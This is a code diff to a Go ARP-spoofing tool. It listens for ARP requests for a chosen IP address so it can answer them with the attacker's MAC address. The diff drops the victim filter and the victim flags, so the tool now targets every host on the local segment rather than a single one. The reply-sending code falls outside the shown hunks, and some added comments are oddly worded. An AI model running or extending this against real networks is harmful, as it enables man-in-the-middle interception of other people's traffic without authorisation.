@@ -1,5 +1,3 @@
-//go:build passive
-
 package main
 
 import (
@@ -7,20 +5,17 @@ import (
 	"fmt"
 	"os"
 
+	"arp-spoofing/internal/arpapp"
 	"github.com/mdlayher/arp"
 )
 
-func run(ifname, victimIPStr, spoofedIPStr string) error {
-	iface, myIP, err := getInterface(ifname)
+func run(ifname, spoofedIPStr string) error {
+	iface, myIP, err := arpapp.GetInterface(ifname)
 	if err != nil {
 		return fmt.Errorf("failed to get local MAC/IP for %s: %w", ifname, err)
 	}
 
-	victimIP, err := parseIPv4(victimIPStr)
-	if err != nil {
-		return err
-	}
-	spoofedIP, err := parseIPv4(spoofedIPStr)
+	spoofedIP, err := arpapp.ParseIPv4(spoofedIPStr)
 	if err != nil {
 		return err
 	}
@@ -33,18 +28,20 @@ func run(ifname, victimIPStr, spoofedIPStr string) error {
 
 	fmt.Printf("[*] Local MAC: %s\n", iface.HardwareAddr)
 	fmt.Printf("[*] Local IP : %s\n", myIP)
-	fmt.Printf("[*] Spoofing: %s claims to be %s\n", victimIP, spoofedIP)
 	fmt.Printf("[*] Listening for ARP requests on %s...\n", ifname)
 
 	for {
 		packet, _, err := client.Read()
+		// 记录
 		if err != nil {
 			return fmt.Errorf("read ARP packet: %w", err)
 		}
+		// need to ARP request
 		if packet.Operation != arp.OperationRequest {
 			continue
 		}
-		if packet.SenderIP != victimIP || packet.TargetIP != spoofedIP {
+		// With this goal in mind
+		if packet.TargetIP != spoofedIP {
 			continue
 		}
 
@@ -59,20 +56,17 @@ func run(ifname, victimIPStr, spoofedIPStr string) error {
 }
 
 func main() {
-	var ifname, victimIP, spoofedIP string
+	var ifname, spoofedIP string
 	flag.StringVar(&ifname, "i", "", "network interface")
-	flag.StringVar(&victimIP, "v", "", "victim IPv4 address")
-	flag.StringVar(&victimIP, "victim", "", "victim IPv4 address")
 	flag.StringVar(&spoofedIP, "s", "", "spoofed IPv4 address")
-	flag.StringVar(&spoofedIP, "spoof", "", "spoofed IPv4 address")
 	flag.Parse()
 
-	if ifname == "" || victimIP == "" || spoofedIP == "" {
+	if ifname == "" || spoofedIP == "" {
 		flag.Usage()
 		os.Exit(1)
 	}
 
-	if err := run(ifname, victimIP, spoofedIP); err != nil {
+	if err := run(ifname, spoofedIP); err != nil {
 		fmt.Fprintln(os.Stderr, err)
 		os.Exit(1)
 	}
